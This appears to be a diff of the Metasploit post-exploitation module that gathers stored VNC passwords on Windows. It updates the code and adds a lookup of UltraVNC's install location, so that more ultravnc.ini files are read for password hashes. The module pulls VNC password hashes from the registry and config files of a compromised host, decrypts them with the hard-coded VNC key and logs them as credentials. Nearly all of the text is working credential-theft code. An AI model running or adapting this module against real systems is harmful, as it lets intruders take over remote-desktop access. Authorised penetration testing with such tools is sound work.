@@ -1,17 +1,12 @@
-# post/windows/gather/enum_vnc_pw.rb
-
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 require 'rex/proto/rfb'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -41,7 +36,7 @@ class Metasploit3 < Msf::Post
     # 5A B2 CD C0 BA DC AF 13
     fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
     pass = Rex::Proto::RFB::Cipher.decrypt ["#{hash}"].pack('H*'), fixedkey
-    return pass
+    pass.gsub(/\0/, '')
   end
 
   # Pull encrypted passwords from file based storage
@@ -66,7 +61,7 @@ class Metasploit3 < Msf::Post
       open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
 
       data = open_key.query_value(variable).data
-      if data.class == Fixnum
+      if data.kind_of? Integer
         return data
       else
         value = data.unpack('H*')[0].to_s
@@ -106,6 +101,20 @@ class Metasploit3 < Msf::Post
         :pass_variable => 'passwd=',
         :viewonly_variable => 'passwd2=',
         :port_variable => 'PortNumber='}
+    end
+
+    #check uninstall key
+    begin
+      root_key, base_key = session.sys.registry.splitkey("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Ultravnc2_is1")
+      open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
+      vnclocation = open_key.query_value("InstallLocation").data
+      locations << {:name => 'UltraVNC',
+        :check_file => vnclocation + "\\ultravnc.ini",
+        :pass_variable => 'passwd=',
+        :viewonly_variable => 'passwd2=',
+        :port_variable => 'PortNumber='}
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
 
     locations << {:name => 'WinVNC3_HKLM',
@@ -200,7 +209,7 @@ class Metasploit3 < Msf::Post
     print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")
 
     locations.map { |e|
-      print_status("Checking #{e[:name]}...")
+      vprint_status("Checking #{e[:name]}...")
       if e.has_key?(:check_reg)
         e[:port] = reg_get(e[:check_reg],e[:port_variable])
         e[:hash] = reg_get(e[:check_reg],e[:pass_variable])
@@ -223,7 +232,7 @@ class Metasploit3 < Msf::Post
         if e[:port] == nil
           e[:port] = 5900
         end
-        print_good("#{e[:name]} => #{e[:hash]} => #{e[:pass]} on port: #{e[:port]}")
+        print_good("Location: #{e[:name]} => Hash: #{e[:hash]} => Password: #{e[:pass]} => Port: #{e[:port]}")
 
         service_data = {
             address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
